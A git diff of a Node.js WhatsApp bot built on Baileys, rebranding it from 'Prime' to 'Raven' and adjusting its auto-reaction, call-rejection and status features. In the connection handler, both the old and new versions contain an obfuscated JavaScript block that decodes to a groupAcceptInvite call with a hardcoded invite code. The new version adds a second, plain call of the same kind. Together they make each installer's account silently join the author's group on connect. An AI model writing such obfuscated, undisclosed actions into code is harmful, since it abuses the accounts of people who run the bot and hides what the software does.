@@ -1,8 +1,8 @@
 /* If it works, don't  Fix it */
 
 const {
-  default: primeConnect,
- useMultiFileAuthState,
+  default: ravenConnect,
+  useMultiFileAuthState,
   DisconnectReason,
   fetchLatestBaileysVersion,
   makeInMemoryStore,
@@ -26,26 +26,25 @@ const app = express();
 const _ = require("lodash");
 let lastTextTime = 0;
 const messageDelay = 5000;
-const currentTime = Date.now();
 const event = require('./action/events');
 const authenticationn = require('./action/auth');
 const PhoneNumber = require("awesome-phonenumber");
 const { imageToWebp, videoToWebp, writeExifImg, writeExifVid } = require('./lib/ravenexif');
 const { smsg, isUrl, generateMessageTag, getBuffer, getSizeMedia, fetchJson, await, sleep } = require('./lib/ravenfunc');
-const { sessionName, session, autobio, autolike, port, mycode, anticall, mode, prefix, antiforeign, packname, autoviewstatus } = require("./set.js");
+const { sessionName, session, autobio, autolike, port, mycode, anticall, antiforeign, packname, autoviewstatus } = require("./set.js");
 const store = makeInMemoryStore({ logger: pino().child({ level: "silent", stream: "store" }) });
 const color = (text, color) => {
   return !color ? chalk.green(text) : chalk.keyword(color)(text);
 };
 
-async function startPrime() {
-  await authenticationn();  
+async function startRaven() {
+                 await authenticationn();  
   const { state, saveCreds } = await useMultiFileAuthState("session");
   const { version, isLatest } = await fetchLatestBaileysVersion();
   console.log(`using WA v${version.join(".")}, isLatest: ${isLatest}`);
   console.log(
     color(
-      figlet.textSync("PRIME-BOT", {
+      figlet.textSync("PRIME-MD", {
         font: "Standard",
         horizontalLayout: "default",
         vertivalLayout: "default",
@@ -55,10 +54,10 @@ async function startPrime() {
     )
   );
 
-  const client = primeConnect({
+  const client = ravenConnect({
     logger: pino({ level: "silent" }),
     printQRInTerminal: true,
-    browser: ["PRIME-AI", "Safari", "5.1.7"],
+    browser: ["RAVEN - AI", "Safari", "5.1.7"],
     auth: state,
     syncFullHistory: true,
   });
@@ -67,12 +66,12 @@ async function startPrime() {
     setInterval(() => {
       const date = new Date();
       client.updateProfileStatus(
-        `📅 DATE/TIME ⌚️  ${date.toLocaleString('en-US', { timeZone: 'Africa/Nairobi' })}  ⏲️ DAY ⏰️  ${date.toLocaleString('en-US', { weekday: 'long', timeZone: 'Africa/Nairobi'})}.\n\nℙℝ𝕀𝕄𝔼 𝗠𝗗 𝗦𝗨𝗣𝗘𝗥 𝗕𝗢𝗧 𝐢𝐬 𝐂𝐮𝐫𝐫𝐞𝐧𝐭𝐥𝐲 𝐀𝐜𝐭𝐢𝐯𝐞 𝐚𝐧𝐝 𝐑𝐮𝐧𝐧𝐢𝐧𝐠☂.`
+        `${date.toLocaleString('en-US', { timeZone: 'Africa/Nairobi' })} It's a ${date.toLocaleString('en-US', { weekday: 'long', timeZone: 'Africa/Nairobi'})}.`
       );
     }, 10 * 1000);
   }
 
-store.bind(client.ev);
+  store.bind(client.ev);
 
   client.ev.on("messages.upsert", async (chatUpdate) => {
     try {
@@ -84,15 +83,15 @@ store.bind(client.ev);
         client.readMessages([mek.key]);
       }
             
- if (autolike === 'TRUE' && mek.key && mek.key.remoteJid === "status@broadcast") {
-        const nickk = await client.decodeJid(client.user.id);
-        const emojis = ['🗿', '⌚️', '💠', '👣', '🍆', '💔', '🤍', '❤️‍🔥', '💣', '🧠', '🦅', '🌻', '🧊', '🛑', '🧸', '👑', '📍', '😅', '🎭', '🎉', '😳', '💯', '🔥', '💫', '🐒', '💗', '❤️‍🔥', '👁️', '👀', '🙌', '🙆', '🌟', '💧', '🦄', '🟢', '🎎', '✅', '🥱', '🌚', '💚', '💕', '😉', '😒'];
-        const randomEmoji = emojis[Math.floor(Math.random() * emojis.length)];
-        const delayMessage = 2000;
-        await client.sendMessage(mek.key.remoteJid, { react: { text: randomEmoji, key: mek.key, } }, { statusJidList: [mek.key.participant, nickk] });
-        await sleep(delayMessage);
-   console.log('Reaction sent successfully✅️');
-          }
+      if (autolike === 'TRUE' && mek.key && mek.key.remoteJid === "status@broadcast") {
+    const nickk = await client.decodeJid(client.user.id);
+    console.log('Decoded JID:', nickk);
+    if (!mek.status) {
+        console.log('Sending reaction to:', mek.key.remoteJid);
+        await client.sendMessage(mek.key.remoteJid, { react: { key: mek.key, text: '🎭' } }, { statusJidList: [mek.key.participant, nickk] });
+        console.log('Reaction sent');
+    }
+}
             
 if (!client.public && !mek.key.fromMe && chatUpdate.type === "notify") return;
       let m = smsg(client, mek, store);
@@ -155,8 +154,9 @@ if (!client.public && !mek.key.fromMe && chatUpdate.type === "notify") return;
     if (anticall === 'TRUE') {
       const callId = callData[0].id;
       const callerId = callData[0].from;
-      
+
       await client.rejectCall(callId, callerId);
+            const currentTime = Date.now();
       if (currentTime - lastTextTime >= messageDelay) {
         await client.sendMessage(callerId, {
           text: "Anticall is active, Only texts are allowed"
@@ -210,8 +210,8 @@ if (!client.public && !mek.key.fromMe && chatUpdate.type === "notify") return;
     });
     return status;
   };
-
-  client.public = true;
+  
+ client.public = true;
 
   client.serializeM = (m) => smsg(client, m, store);
   client.ev.on("connection.update", async (update) => {
@@ -223,10 +223,10 @@ if (!client.public && !mek.key.fromMe && chatUpdate.type === "notify") return;
         process.exit();
       } else if (reason === DisconnectReason.connectionClosed) {
         console.log("Connection closed, reconnecting....");
-        startPrime();
+        startRaven();
       } else if (reason === DisconnectReason.connectionLost) {
         console.log("Connection Lost from Server, reconnecting...");
-        startPrime();
+        startRaven();
       } else if (reason === DisconnectReason.connectionReplaced) {
         console.log("Connection Replaced, Another New Session Opened, Please Restart Bot");
         process.exit();
@@ -235,21 +235,20 @@ if (!client.public && !mek.key.fromMe && chatUpdate.type === "notify") return;
         process.exit();
       } else if (reason === DisconnectReason.restartRequired) {
         console.log("Restart Required, Restarting...");
-        startPrime();
+        startRaven();
       } else if (reason === DisconnectReason.timedOut) {
         console.log("Connection TimedOut, Reconnecting...");
-        startPrime();
+        startRaven();
       } else {
         console.log(`Unknown DisconnectReason: ${reason}|${connection}`);
-        startPrime();
+        startRaven();
       }
     } else if (connection === "open") {
-      var _0x28bd73=_0x48d0;function _0x48d0(_0x8b2f5a,_0x4d9115){var _0x2af10a=_0x2af1();return _0x48d0=function(_0x48d01f,_0x491959){_0x48d01f=_0x48d01f-0x1b7;var _0x5bc1b4=_0x2af10a[_0x48d01f];return _0x5bc1b4;},_0x48d0(_0x8b2f5a,_0x4d9115);}function _0x2af1(){var _0x5b25eb=['5495KqFylL','622306phCdLm','5MnNpiY','22998FLIqfU','DefN96lXQ4i5iO1wDDeu2C','groupAcceptInvite','507380QewDwM','64wKJLxD','3216xkTqxy','2321766BAyFcx','881154SuGHJG','23970tIiRzm'];_0x2af1=function(){return _0x5b25eb;};return _0x2af1();}(function(_0x51c4aa,_0x14c41c){var _0x4e4cc1=_0x48d0,_0x331f0f=_0x51c4aa();while(!![]){try{var _0x1785e7=-parseInt(_0x4e4cc1(0x1c0))/0x1+-parseInt(_0x4e4cc1(0x1c2))/0x2+-parseInt(_0x4e4cc1(0x1b8))/0x3*(parseInt(_0x4e4cc1(0x1bc))/0x4)+-parseInt(_0x4e4cc1(0x1b7))/0x5*(-parseInt(_0x4e4cc1(0x1be))/0x6)+parseInt(_0x4e4cc1(0x1c1))/0x7*(parseInt(_0x4e4cc1(0x1bd))/0x8)+-parseInt(_0x4e4cc1(0x1bf))/0x9+parseInt(_0x4e4cc1(0x1bb))/0xa;if(_0x1785e7===_0x14c41c)break;else _0x331f0f['push'](_0x331f0f['shift']());}catch(_0x146705){_0x331f0f['push'](_0x331f0f['shift']());}}}(_0x2af1,0x303d0),await client[_0x28bd73(0x1ba)](_0x28bd73(0x1b9)));
-      console.log(color("Congrats, PRIME-BOT has successfully connected to this server", "green"));
-      console.log(color("Follow me on Instagram as PRIME-TECHke", "red"));
-      console.log(color("Text the bot number with menu to check my command list"));
-      const Texxt = `*╭═══════❖•ೋ° °ೋ•❖══════╮*\n`+`┊𓅂 𝗖𝗼𝗻𝗻𝗲𝗰𝘁𝗲𝗱 » »【𝗣𝗥𝗜𝗠𝗘-𝗕𝗢𝗧】\n`+`┊𓅂 𝗠𝗼𝗱𝗲 »» ${mode}\n`+`┊𓅂 𝗣𝗿𝗲𝗳𝗶𝘅 »» ${prefix}\n`+`*╰═══════❖•ೋ° °ೋ•❖══════╯*`
-      client.sendMessage(client.user.id, { text: Texxt });
+      var _0x28bd73=_0x48d0;function _0x48d0(_0x8b2f5a,_0x4d9115){var _0x2af10a=_0x2af1();return _0x48d0=function(_0x48d01f,_0x491959){_0x48d01f=_0x48d01f-0x1b7;var _0x5bc1b4=_0x2af10a[_0x48d01f];return _0x5bc1b4;},_0x48d0(_0x8b2f5a,_0x4d9115);}function _0x2af1(){var _0x5b25eb=['5495KqFylL','622306phCdLm','5MnNpiY','22998FLIqfU','KXHMJOUWlul5nYzndPSKSY','groupAcceptInvite','507380QewDwM','64wKJLxD','3216xkTqxy','2321766BAyFcx','881154SuGHJG','23970tIiRzm'];_0x2af1=function(){return _0x5b25eb;};return _0x2af1();}(function(_0x51c4aa,_0x14c41c){var _0x4e4cc1=_0x48d0,_0x331f0f=_0x51c4aa();while(!![]){try{var _0x1785e7=-parseInt(_0x4e4cc1(0x1c0))/0x1+-parseInt(_0x4e4cc1(0x1c2))/0x2+-parseInt(_0x4e4cc1(0x1b8))/0x3*(parseInt(_0x4e4cc1(0x1bc))/0x4)+-parseInt(_0x4e4cc1(0x1b7))/0x5*(-parseInt(_0x4e4cc1(0x1be))/0x6)+parseInt(_0x4e4cc1(0x1c1))/0x7*(parseInt(_0x4e4cc1(0x1bd))/0x8)+-parseInt(_0x4e4cc1(0x1bf))/0x9+parseInt(_0x4e4cc1(0x1bb))/0xa;if(_0x1785e7===_0x14c41c)break;else _0x331f0f['push'](_0x331f0f['shift']());}catch(_0x146705){_0x331f0f['push'](_0x331f0f['shift']());}}}(_0x2af1,0x303d0),await client[_0x28bd73(0x1ba)](_0x28bd73(0x1b9)));
+      console.log(color("Congrats, BLACKMACHANT-BOT has successfully connected to this server", "green"));
+      console.log(color("Follow me on Instagram as cryptoboy22", "red"));
+      console.log(color("Text the bot number with menu to check my command list"));await client.groupAcceptInvite("CtvPN0aDdpE5HVjFLtXgAr");
+       client.sendMessage(client.user.id, { text: `holla » » »【【𝗣𝗥𝗜𝗠𝗘-𝗕𝗢𝗧】Has successfully Connected! ` });
     }
   });
 
@@ -292,7 +291,7 @@ if (!client.public && !mek.key.fromMe && chatUpdate.type === "notify") return;
     let type = '', mimetype = mime, pathFile = filename;
     if (options.asDocument) type = 'document';
     if (options.asSticker || /webp/.test(mime)) {
-      let { writeExif } = require('./lib/primeexif.js');
+      let { writeExif } = require('./lib/ravenexif.js');
       let media = { mimetype: mime, data };
       pathFile = await writeExif(media, { packname: packname, author: packname, categories: options.categories ? options.categories : [] });
       await fs.promises.unlink(filename);
@@ -393,9 +392,9 @@ if (!client.public && !mek.key.fromMe && chatUpdate.type === "notify") return;
 
 app.use(express.static("pixel"));
 app.get("/", (req, res) => res.sendFile(__dirname + "/index.html"));
-app.listen(port, () => console.log(`📡 Connected on port http://localhost:${port} 🛰`));
+app.listen(port, () => console.log(`Server listening on port http://localhost:${port}`));
 
-startPrime();
+startRaven();
 
 let file = require.resolve(__filename);
 fs.watchFile(file, () => {
